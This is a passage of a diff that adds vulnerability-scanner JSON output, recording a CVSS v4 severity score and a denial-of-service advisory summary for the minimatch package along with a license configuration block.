+              "severity": [
+                {
+                  "score": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N",
+                  "type": "CVSS_V4"
+                }
+              ],
+              "summary": "minimatch has potential denial of service via globparts amplification"
+            }
+          ]
+        }
+      ]
+    }
+  ],
+  "experimental_config": {
+    "licenses": {
+      "summary": false,
+      "allowlist": null
+    }
+  }
+}
